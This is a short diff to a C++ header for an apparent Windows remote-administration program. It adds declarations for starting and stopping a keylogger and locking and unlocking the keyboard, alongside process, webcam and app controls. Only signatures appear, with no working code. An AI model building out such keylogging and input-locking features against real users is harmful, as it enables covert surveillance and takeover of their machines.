@@ -1,6 +1,5 @@
 #pragma once
 
-#include "const.h"
 #include <atomic>
 #include <chrono>
 #include <codecvt>
@@ -14,6 +13,9 @@
 #include <thread>
 #include <vector>
 #include <windows.h>
+
+#include "const.h"
+#include "utils.h"
 
 #pragma region Process operations
 bool listProcess(std::string& result);
@@ -45,4 +47,11 @@ bool stopWebcam(std::string& result);
 bool listApps(std::string& result);
 bool startApp(std::string name, std::string& result);
 bool stopApp(std::string name, std::string& result);
+#pragma endregion
+
+#pragma region Keyboard operations
+bool startKeylogger(std::string& result);
+bool stopKeylogger(std::string& result, std::ifstream& file);
+bool lockKeyboard(std::string& result);
+bool unlockKeyboard(std::string& result);
 #pragma endregion
